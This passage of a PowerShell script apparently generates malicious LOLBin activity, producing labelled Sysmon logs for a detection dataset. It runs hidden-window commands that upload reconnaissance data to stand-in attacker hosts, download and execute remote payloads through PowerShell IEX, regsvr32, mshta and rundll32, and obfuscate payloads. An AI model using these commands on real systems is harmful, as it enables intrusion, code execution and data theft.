        {
            Start-Process powershell.exe -ArgumentList "-NoP", "-W", "Hidden", "-Command", "Get-WmiObject -Class Win32_ComputerSystem | Select-Object Name, Domain, Manufacturer | Out-File `$env:TEMP\computer.txt; Invoke-WebRequest -Uri 'http://attacker.com/upload.php' -Method POST -InFile `$env:TEMP\computer.txt" -WindowStyle Hidden
        },
        {
            Start-Process cmd.exe -ArgumentList "/c", "whoami /all > `$env:TEMP\whoami.txt && net user > `$env:TEMP\netuser.txt && net localgroup administrators > `$env:TEMP\admins.txt && bitsadmin /transfer upload http://malicious.com/upload.php `$env:TEMP\whoami.txt" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Out-File `$env:TEMP\network.txt; (New-Object Net.WebClient).UploadFile('http://evil.com/upload.php', `$env:TEMP\network.txt)" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed discovery/recon attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# FILELESS ATTACKS
# ============================================================================

function Invoke-FilelessAttack {
    Write-Section "Fileless Attacks"
    
    $attacks = @(
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "`$code = (Invoke-WebRequest -Uri 'http://malicious.com/payload.ps1').Content; Invoke-Expression `$code" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoP", "-W", "Hidden", "-Command", "`$script = (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1'); Invoke-Expression `$script" -WindowStyle Hidden
        },
        {
            Start-Process regsvr32.exe -ArgumentList "/s", "/n", "/u", "/i:http://attacker.com/payload.sct", "scrobj.dll" -WindowStyle Hidden
        },
        {
            Start-Process mshta.exe -ArgumentList "http://malicious.com/payload.hta" -WindowStyle Hidden
        },
        {
            Start-Process rundll32.exe -ArgumentList "javascript:`"\\..\\mshtml,RunHTMLApplication `";document.write();eval((new ActiveXObject('MSXML2.XMLHTTP')).open('GET','http://evil.com/payload.ps1',false).send().responseText);" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed fileless attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# ADVANCED EVASION ATTACKS
# ============================================================================

function Invoke-AdvancedEvasionAttack {
    Write-Section "Advanced Evasion Attacks"
    
    $attacks = @(
        {
            $payload = "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
            $obfuscated = -join ($encoded.ToCharArray() | ForEach-Object { [char]([int][char]$_ + 1) })
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "`$e='$obfuscated'; `$d=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((`$e.ToCharArray() | ForEach-Object { [char]([int][char]$_ - 1) }) -join '')); Invoke-Expression `$d" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", "`$env:PSModulePath=''; IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoP", "-W", "Hidden", "-Command", "`$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'; `$PSDefaultParameterValues['*:ErrorAction'] = 'SilentlyContinue'; IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" -WindowStyle Hidden
        },
        {
            Start-Process cmd.exe -ArgumentList "/c", "set PSModulePath= && powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "`$ProgressPreference='SilentlyContinue'; `$ErrorActionPreference='SilentlyContinue'; IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed advanced evasion attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================

Write-Host @"
╔══════════════════════════════════════════════════════════════════════╗
║     COMPREHENSIVE MALICIOUS LOLBIN ATTACK GENERATOR                  ║
║     WARNING: This script generates malicious attack patterns         ║
║     Use only in isolated test environments!                          ║
╚══════════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Red

Write-Host "`nConfiguration:" -ForegroundColor Cyan
Write-Host "  Attack Count: $AttackCount" -ForegroundColor White
Write-Host "  Delay Between Attacks: $DelayBetweenAttacks seconds" -ForegroundColor White
Write-Host "  Log File: $LogFile" -ForegroundColor White
Write-Host ""

$confirm = Read-Host "Are you sure you want to proceed? (YES to continue)"
if ($confirm -ne "YES") {
    Write-Host "Aborted." -ForegroundColor Yellow
    exit
}

# Initialize log file
"=== Malicious LOLBin Attack Generation Started ===" | Out-File -FilePath $LogFile
"Start Time: $(Get-Date)" | Out-File -FilePath $LogFile -Append

$totalAttacks = 0
$attackFunctions = @(
    { Invoke-PowerShellEncodedAttack },
    { Invoke-PowerShellDownloadAttack },
    { Invoke-PowerShellExecutionAttack },
    { Invoke-PowerShellEvasionAttack },
    { Invoke-CMDExecutionAttack },
    { Invoke-WMICAttack },
    { Invoke-CertUtilAttack },
    { Invoke-Regsvr32Attack },
    { Invoke-MSHTAAttack },
    { Invoke-Rundll32Attack },
    { Invoke-CScriptWScriptAttack },
    { Invoke-BITSAdminAttack },
    { Invoke-SchTasksPersistenceAttack },
    { Invoke-RegistryPersistenceAttack },
    { Invoke-CredentialAccessAttack },
    { Invoke-LateralMovementAttack },
    { Invoke-DiscoveryReconAttack },
    { Invoke-FilelessAttack },
    { Invoke-AdvancedEvasionAttack }
)

Write-Host "`nStarting attack generation..." -ForegroundColor Green
Write-Host "This will generate realistic malicious LOLBin attack patterns." -ForegroundColor Yellow
Write-Host ""

# Execute attacks
for ($i = 0; $i -lt $AttackCount; $i++) {
    $attackFunc = Get-Random -InputObject $attackFunctions
    try {
        & $attackFunc
        $totalAttacks++
        
        if ($PSCmdlet.MyInvocation.BoundParameters["Verbose"].IsPresent) {
            Write-Host "[$totalAttacks/$AttackCount] Attack executed" -ForegroundColor Gray
        }
        
        Start-Sleep -Seconds $DelayBetweenAttacks
    } catch {
        Write-AttackLog "Error executing attack: $($_.Exception.Message)" "Red"
    }
    
    # Progress indicator
    if ($i % 100 -eq 0 -and $i -gt 0) {
        Write-Host "Progress: $i/$AttackCount attacks executed" -ForegroundColor Cyan
    }
}

Write-Section "Attack Generation Complete"
Write-AttackLog "Total attacks executed: $totalAttacks" "Green"
Write-AttackLog "End Time: $(Get-Date)" "Green"
"=== Malicious LOLBin Attack Generation Completed ===" | Out-File -FilePath $LogFile -Append

Write-Host "`n✅ Attack generation complete!" -ForegroundColor Green
Write-Host "   Total attacks: $totalAttacks" -ForegroundColor White
Write-Host "   Log file: $LogFile" -ForegroundColor White
Write-Host "`nNext steps:" -ForegroundColor Cyan
Write-Host "1. Export Sysmon logs: wevtutil epl `"Microsoft-Windows-Sysmon/Operational`" `"C:\SysmonLogs\Malicious_$(Get-Date -Format 'yyyyMMdd_HHmmss').evtx`"" -ForegroundColor White
Write-Host "2. Process the logs with: python scripts/process_evtx_files.py --input-dir C:\SysmonLogs --output-dir data/processed/malicious --label 1" -ForegroundColor White
Write-Host ""

